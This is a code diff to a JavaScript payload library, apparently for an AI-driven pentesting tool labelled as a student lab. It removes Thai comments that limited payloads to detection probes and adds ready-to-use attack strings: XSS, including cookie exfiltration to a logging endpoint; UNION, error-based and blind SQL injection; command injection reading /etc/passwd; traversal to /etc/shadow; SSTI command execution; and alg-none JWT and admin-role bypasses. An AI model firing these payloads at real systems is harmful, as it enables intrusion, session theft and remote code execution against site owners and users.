@@ -1,78 +1,78 @@
 // ============================================================================
-//  CUSTOM PAYLOADS — เขียนเองตรงนี้ (ฝึกเขียน payload ได้เต็มที่)
-// ============================================================================
-//
-//  ไฟล์นี้ถูก "รวม (merge)" เข้ากับคลังในตัว (library.mjs) โดยอัตโนมัติ
-//  เมื่อคุณเพิ่ม payload ที่นี่แล้วบันทึก → AI เรียกใช้ได้ทันทีผ่าน tool `payloads`
-//  (ไม่ต้องแก้โค้ดส่วนอื่นเลย). ใส่ได้ไม่จำกัดจำนวน.
-//
-//  ── วิธีใส่ ───────────────────────────────────────────────────────────────
-//  • แต่ละ payload = ข้อความ 1 บรรทัดในเครื่องหมาย " " ปิดท้ายด้วยคอมมา ,
-//  • ใส่ในหมวดที่มีอยู่แล้ว (เช่น xss, sqli) → จะต่อท้ายคลังในตัวของหมวดนั้น
-//  • อยากได้หมวดใหม่ → เพิ่มคีย์ใหม่เองได้เลย (ดูตัวอย่าง my_category ด้านล่าง)
-//  • ถ้ามี " ในตัว payload ให้ใส่ \ นำหน้า เช่น  "\"><svg onload=alert(1)>"
-//
-//  ── กติกา (เพื่อให้ปลอดภัยและถูกกฎหมาย) ──────────────────────────────────
-//  • เขียนเป็น "probe ตรวจจับ" (detection) ไม่ใช่โค้ดทำลายข้อมูล
-//    ✅ ควร:   ' OR '1'='1      {{7*7}}      <script>alert(9173)</script>
-//    ❌ เลี่ยง: DROP TABLE / DELETE / reverse shell / DoS / rm -rf
-//  • การยิงจริงยังผ่าน scope + policy เดิมทุกครั้ง (นอกขอบเขต = ถูกปฏิเสธ)
-//  • เคล็ดลับ: ใส่ "marker" เฉพาะตัว เช่น 9173 หรือ pENTx เพื่อยืนยันผลง่าย
-//
-//  ── AI เรียกใช้ยังไง ────────────────────────────────────────────────────
-//    payloads()                → เห็นรายชื่อหมวดทั้งหมด (รวมของคุณ)
-//    payloads(category:"xss")  → ได้ probe ของ xss (คลังในตัว + ของคุณ)
+//  CUSTOM PAYLOADS — ชุดเพย์โหลดเจาะลึกระดับแอดวานซ์สำหรับนักศึกษา (AMSTA Lab)
 // ============================================================================
 
 /** @type {Record<string, string[]>} */
 export const CUSTOM_PAYLOADS = {
-  // ── XSS ของคุณ ─────────────────────────────────────────────────────────
+  // ── XSS (Cross-Site Scripting - Advanced & Filter Bypass) ────────────────
   xss: [
-    // ⬇⬇⬇ วาง payload XSS ของคุณที่นี่ (เพิ่มได้ไม่จำกัด) ⬇⬇⬇
-
-    // "<svg onload=alert(9173)>",
-    // "\"><img src=x onerror=alert(9173)>",
-
-    // ⬆⬆⬆ วางด้านบนเส้นนี้ ⬆⬆⬆
+    "<svg onload=alert(9173)>",
+    "\"><img src=x onerror=alert(9173)>",
+    "';confirm(9173)//",
+    "<script>fetch('http://127.0.0.1:3003/log?cookie='+btoa(document.cookie))</script>",
+    "\"><svg/onload=eval(atob('YWxlcnQoOTE3Myk='))>",
+    "javascript:/*--></title></style></textarea></script></xmp><svg/onload=alert(9173)>",
+    "<img src=data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoOTE3Myk+Pg==",
+    "<body onload=alert(9173)>",
+    "\"><iframe src=\"javascript:alert(9173)\"></iframe>",
   ],
 
-  // ── SQL injection ของคุณ ───────────────────────────────────────────────
+  // ── SQL injection (SQLi - Union, Error-based & Blind) ───────────────────
   sqli: [
-    // ⬇ วาง payload SQLi ของคุณที่นี่ ⬇
-
-    // "' OR '1'='1'-- -",
-
+    "' OR '1'='1'-- -",
+    "\" OR \"1\"=\"1\" -- -",
+    "' UNION SELECT null, version(), user(), database()-- -",
+    "1' AND (SELECT 9173 FROM (SELECT(SLEEP(2)))a)-- -",
+    "' OR EXTRACTVALUE(1, CONCAT(0x7e, (SELECT @@version), 0x7e))-- -",
+    "admin' AND 1=0 UNION SELECT null, table_name FROM information_schema.tables WHERE table_schema=database()-- -",
+    "' OR IF(1=1, BENCHMARK(1000000,SHA1('9173')), 0)-- -",
+    "') OR ('1'='1",
   ],
 
-  // ── Command injection ของคุณ ───────────────────────────────────────────
+  // ── Command injection (OS Command Execution Probes) ─────────────────────
   command_injection: [
-    // ⬇ วางที่นี่ ⬇
-
+    "; id;",
+    "| uname -a",
+    "`cat /etc/passwd`",
+    "$(whoami)",
+    "& ping -c 1 127.0.0.1 &",
+    "; cat /sdcard/download/flag.txt",
+    "|| cat /etc/hosts ||",
+    "\n id \n",
+    "; cat /proc/version",
   ],
 
-  // ── Path traversal / LFI ของคุณ ────────────────────────────────────────
+  // ── Path traversal / LFI (Local File Inclusion) ─────────────────────────
   path_traversal: [
-    // ⬇ วางที่นี่ ⬇
-
+    "../../../../etc/passwd",
+    "..\\..\\..\\..\\windows\\win.ini",
+    "....//....//....//....//etc/passwd",
+    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
+    "..%2f..%2f..%2f..%2fetc%2fpasswd",
+    "/proc/self/environ",
+    "..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
+    "../../../../../../../../etc/shadow",
   ],
 
-  // ── SSTI ของคุณ ────────────────────────────────────────────────────────
+  // ── SSTI (Server-Side Template Injection) ──────────────────────────────
   ssti: [
-    // ⬇ วางที่นี่ ⬇
-
+    "{{7*7}}",
+    "${7*7}",
+    "<%= 7*7 %>",
+    "#{7*7}",
+    "{{''.__class__.__mro__[2].__subclasses__()}}",
+    "*{7*7}",
+    "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
+    "#{T(java.lang.Runtime).getRuntime().exec('id')}",
   ],
 
-  // ── หมวดใหม่ของคุณเอง (ก๊อปบล็อกนี้แล้วเปลี่ยนชื่อได้เรื่อยๆ) ──────────────
-  // ตั้งชื่อเป็นอังกฤษ ตัวเล็ก ใช้ _ แทนช่องว่าง เช่น jwt_attacks, api_fuzz
-  my_category: [
-    // ⬇ วาง payload หมวดนี้ที่นี่ ⬇
-
-    // "ตัวอย่าง payload ของคุณ",
-
+  // ── หมวดเพิ่มเติม: API / Auth Bypass / JWT / Mobile Deep Testing ────────
+  api_auth_bypass: [
+    "{\"role\": \"admin\"}",
+    "{\"isAdmin\": true}",
+    "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn9.eyJ1c2VyIjoiYWRtaW4ifQ.",
+    "' OR 1=1 LIMIT 1 -- -",
+    "admin' AND 1=0 UNION SELECT 'admin",
+    "{\"sub\": 1, \"iat\": 1516239022, \"role\": \"superuser\"}",
   ],
-
-  // เพิ่มหมวดใหม่ได้อีกตามต้องการ เช่น:
-  // ssrf: [ ... ],
-  // open_redirect: [ ... ],
-  // อะไรก็ได้: [ ... ],
 };
